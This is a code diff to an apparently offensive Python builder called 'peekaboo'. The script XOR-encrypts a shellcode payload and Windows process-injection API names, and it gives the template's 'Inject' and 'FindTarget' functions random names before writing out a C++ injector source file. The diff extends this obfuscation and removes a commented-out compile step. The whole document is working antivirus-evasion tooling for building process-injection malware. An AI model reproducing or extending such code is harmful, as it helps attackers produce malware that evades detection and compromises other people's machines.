@@ -98,10 +98,12 @@ def run_peekaboo(host, port, proc_name):
     f_p32n = "Process32Next"
 
     f_xor = "XOR("
+    f_inj = "Inject("
+    f_ftt = "FindTarget"
 
     print (Colors.BLUE + "process name: " + proc_name + "..." + Colors.ENDC)
     print (Colors.BLUE + "encrypt..." + Colors.ENDC)
-    f_xor = encryptor.random()
+    f_xor, f_inj, f_ftt = encryptor.random(), encryptor.random(), encryptor.random()
     ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
     ciphertext_vaex, vaex_key = encryptor.xor_encrypt(f_vaex, encryptor.func_key())
     ciphertext_wpm, wpm_key = encryptor.xor_encrypt(f_wpm, encryptor.func_key())
@@ -131,22 +133,14 @@ def run_peekaboo(host, port, proc_name):
     data = data.replace('char my_proc_key[] = "";', 'char my_proc_key[] = "' + proc_key + '";')
     data = data.replace('char f_key[] = "";', 'char f_key[] = "' + vaex_key + '";')
     data = data.replace('XOR(', f_xor + "(")
+    data = data.replace("Inject(", f_inj + "(")
+    data = data.replace("FindTarget(", f_ftt + "(")
 
     tmp.close()
     tmp = open("peekaboo-enc.cpp", "w+")
     tmp.write(data)
     tmp.close()
 
-    # try:
-    #     cmd = "x86_64-w64-mingw32-g++ -shared -o peekaboo.exe peekaboo-enc.cpp -fpermissive >/dev/null 2>&1"
-    #     os.system(cmd)
-    # except:
-    #     print (Colors.RED + "error compiling template :(" + Colors.ENDC)
-    #     sys.exit()
-    # else:
-    #     print (Colors.YELLOW + cmd + Colors.ENDC)
-    #     print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
-    #     print (Colors.GREEN + "peekaboo.exe")
     print (Colors.GREEN + "successfully encrypt template file :)" + Colors.ENDC)
     print (Colors.GREEN + "compile via compile-inj.bat" + Colors.ENDC)
 
